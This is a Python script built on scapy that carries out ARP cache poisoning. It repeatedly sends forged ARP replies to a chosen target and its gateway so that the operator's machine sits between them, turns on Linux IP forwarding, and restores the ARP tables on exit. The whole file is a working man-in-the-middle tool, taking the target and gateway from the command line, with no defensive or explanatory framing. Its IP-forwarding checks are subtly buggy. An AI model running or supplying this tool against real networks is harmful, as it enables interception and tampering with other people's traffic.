#!/usr/bin/env_python
import time
import optparse
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send


def get_mac(ip):
    """The function returns the MAC-address that matches the IP-address"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    package = broadcast / arp_request
    answered = srp(package, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoofing(target_ip, gateway_ip):
    """ Spoofs `target_ip` saying that we are `gateway_ip` (changing the ARP cache of the target (poisoning))"""
    target_mac = get_mac(target_ip)
    package = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(package, verbose=False)


def restore(dest_ip, src_ip):
    """Restores the normal process of a regular network"""
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    package = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(package, count=4, verbose=False)


def enable_ip_forwarding():
    """Enables IP forwarding in Linux"""
    file_path = "/proc/sys/net/ipv4/ip_forward"
    print("Enabling IP-Routing")
    try:
        with open(file_path, "r+") as f:
            if f.read() == 1:
                pass
            else:
                print(1, file=f)
            print("IP-Routing enabled")
    except:
        print("Something bad")


def disable_ip_forwarding():
    """Disables IP forwarding in Linux"""
    file_path = "/proc/sys/net/ipv4/ip_forward"
    print("Disabling IP-Routing")
    try:
        with open(file_path, "r+") as f:
            if f.read() == 1:
                print(0, file=f)
            else:
                pass
        print("IP-Routing disabled")
    except:
        print("Something bad")


def get_arguments():
    """The function accepts arguments from the terminal"""
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP-address to ARP poison")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP-address to ARP poison")
    (options, arguments) = parser.parse_args()
    return options


if __name__ == "__main__":
    enable_ip_forwarding()
    args = get_arguments()
    target, gateway = args.target, args.gateway
    if target is None:
        target = input("Enter target IP-address: ")
    if gateway is None:
        gateway = input("Enter gateway IP-address: ")
    count = 0
    try:
        while True:
            spoofing(target, gateway)
            spoofing(gateway, target)
            count += 2
            print(f"\rSent {count} packets", end='')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nQuitting and restoring ARP-tables\n")
        restore(target, gateway)
        restore(gateway, target)
        disable_ip_forwarding()
